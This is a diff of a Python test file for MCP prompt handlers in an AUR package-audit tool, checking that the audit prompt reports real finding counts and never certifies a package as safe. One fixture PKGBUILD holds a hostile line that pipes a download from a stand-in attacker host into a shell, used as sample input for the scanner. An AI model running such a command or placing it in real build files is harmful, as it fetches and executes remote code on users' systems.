@@ -4,8 +4,8 @@ Tests for the MCP prompt handlers.
 
 Every prompt used to raise AttributeError before reaching the client, because
 the handlers built content with ``PromptMessage.TextContent``, which does not
-exist. Nothing exercised them, so the breakage was invisible. These tests
-render each registered prompt and assert it produces real content.
+exist. Nothing exercised them, so the breakage was invisible. These tests render
+each registered prompt and assert it produces real content.
 """
 
 import importlib
@@ -42,6 +42,10 @@ def stubbed_network():
         yield
 
 
+async def _prompt_names():
+    return [p.name for p in await server.list_prompts()]
+
+
 class TestPromptsRender:
     @pytest.mark.asyncio
     async def test_every_registered_prompt_renders(self, stubbed_network):
@@ -53,8 +57,7 @@ class TestPromptsRender:
         """
         failures = []
 
-        for prompt in await server.list_prompts():
-            name = prompt.name
+        for name in await _prompt_names():
             try:
                 result = await server.get_prompt(name, PROMPT_ARGUMENTS.get(name, {}))
             except Exception as e:  # noqa: BLE001 - the point is to catch anything
@@ -77,14 +80,16 @@ class TestPromptsRender:
             await server.get_prompt("no_such_prompt", {})
 
 
-class TestAuditPromptReportsRealFindings:
+class TestAuditPromptDoesNotCertify:
     """
-    The audit prompt counted findings from a key the analyser never returns, so
-    it reported zero issues for every package, however bad.
+    The audit prompt must not tell the model a package looks safe.
+
+    It is the one place that reaches the caller with a verdict, so it has to
+    agree with analyze_pkgbuild_safety, which deliberately stopped issuing one.
     """
 
     @pytest.mark.asyncio
-    async def test_counts_reflect_the_scan(self):
+    async def test_reports_real_counts_and_no_verdict(self):
         async def aur_info(_name):
             return {"data": {"Name": "demo", "NumVotes": 2, "Maintainer": None}}
 
@@ -92,6 +97,8 @@ class TestAuditPromptReportsRealFindings:
             return (
                 'pkgname=demo\n'
                 'url="https://github.com/upstream/demo"\n'
+                'source=("git+https://elsewhere.example.com/demo.git")\n'
+                'sha256sums=("SKIP")\n'
                 'build() { curl -s http://evil.tk/payload | sh; }\n'
             )
 
@@ -102,18 +109,20 @@ class TestAuditPromptReportsRealFindings:
         text = result.messages[-1].content.text
 
         assert "Error auditing" not in text
-        # Piping curl into a shell is a red flag; the report must say so
-        # instead of the hardcoded zero the missing "findings" key produced.
-        assert "**Critical Issues**: 0" not in text
+        # The curl-pipe-shell line is a red flag; the count must reflect it
+        # rather than the hardcoded zero the old "findings" key produced.
+        assert "**Critical patterns matched**: 1" in text
+        assert "appears safe to install" not in text
+        # The scan's own limitations travel with its findings.
+        assert "What this scan does not cover" in text
 
     @pytest.mark.asyncio
-    async def test_metadata_lists_render_as_text(self):
-        """risk_factors and trust_indicators are dicts; joining them raised."""
+    async def test_clean_package_still_refuses_to_certify(self):
         async def aur_info(_name):
-            return {"data": {"Name": "demo", "NumVotes": 0, "Maintainer": None}}
+            return {"data": {"Name": "demo", "NumVotes": 500, "Maintainer": "someone"}}
 
         async def pkgbuild(_name):
-            return 'pkgname=demo\npkgver=1.0\n'
+            return 'pkgname=demo\npkgver=1.0\nurl="https://example.com/demo"\n'
 
         with patch.object(server, "get_aur_info", new=aur_info), \
              patch.object(server, "get_pkgbuild", new=pkgbuild):
@@ -121,11 +130,9 @@ class TestAuditPromptReportsRealFindings:
 
         text = result.messages[-1].content.text
 
-        assert "Error auditing" not in text
-        assert "Risk Factors" in text
-        # A dict would render as "{'category': ...}" rather than prose.
-        assert "'category'" not in text
-
+        assert "**Critical patterns matched**: 0" in text
+        assert "appears safe to install" not in text
+        assert "not evidence that the package is safe" in text
 
 def _popular_package():
     """A package no honest audit could call orphaned or unpopular."""
